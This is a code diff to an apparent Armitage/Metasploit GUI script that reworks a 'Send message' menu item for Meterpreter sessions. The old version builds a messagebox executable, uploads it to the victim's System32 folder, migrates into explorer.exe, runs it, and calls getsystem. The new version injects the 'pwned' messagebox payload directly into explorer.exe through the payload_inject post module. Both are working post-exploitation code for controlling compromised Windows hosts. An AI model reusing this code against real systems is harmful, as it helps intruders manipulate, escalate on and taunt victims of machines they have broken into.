@@ -13,36 +13,23 @@ popup meterpreter_bottom {
 				m_cmd($1, "uictl disable mouse");
 			}
 			
-			item "Send message" {
-				# using windows/message box instead of net send due to messaging service getting borked by ms08-067
-				$message = prompt_text("Enter message. (255 max char)");
-				$messagebox = generate("windows/messagebox", lhost(), $null, %(TITLE => "pwned", TEXT => "$message"), "exe");
-                               	$random = random_port(); 
-				$message_handle = openf(">/tmp/message_" . $random . ".exe");
-                                writeb($message_handle, $messagebox);
-                                closef($message_handle);	
-				m_cmd($1, "upload /tmp/message_" . $random . ".exe c:\\\\Windows\\\\System32\\\\");
-				# migrate to users
-				m_cmd($1, "ps");
-				$do_once = 0;
-				on meterpreter_ps {
-				 	local ('@processes $process $name');
-					@processes = parse_ps($3);
-					foreach $process (@processes) {
-						($name, $pid) = values($process, @('Name', 'PID'));
-						if (("explorer.exe" eq $name) && ($do_once eq 0)) {
-							m_cmd($1, "migrate $pid");
-							$do_once++;
-						}
-					}
-				}
-				m_cmd($1, "execute -f c:\\\\Windows\\\\System32\\\\message_" . $random . ".exe");
-				# revert back to sys
-				m_cmd($1, "getsystem");
-				on meterpreter_rm {
-					println("DEBUG: $1, $2, $3");
-				}
-			}
+                        item "Send message" {
+                                # using windows/message box instead of net send due to messaging service getting borked by ms08-067
+                                $message = prompt_text("Enter message. (255 max char)");
+                                m_cmd($1, "ps");
+                                $do_once = 0;
+                                on meterpreter_ps {
+                                        local ('@processes $process $name');
+                                        @processes = parse_ps($3);
+                                        foreach $process (@processes) {
+                                                ($name, $pid) = values($process, @('Name', 'PID'));
+                                                if (("explorer.exe" eq $name) && ($do_once eq 0)) {
+                                                        launch("post", "windows/manage/payload_inject", %(LHOST => lhost(), OPTIONS => "TITLE=pwned,TEXT=$message", PAYLOAD => "windows/messagebox", PID => "$pid", SESSION => "$1"));
+                                                        $do_once++;
+                                                }
+                                        }
+                                }
+                        }
 
 			item "Auto-kill special apps" {
 			# To Do: let users pick which tasks t kill
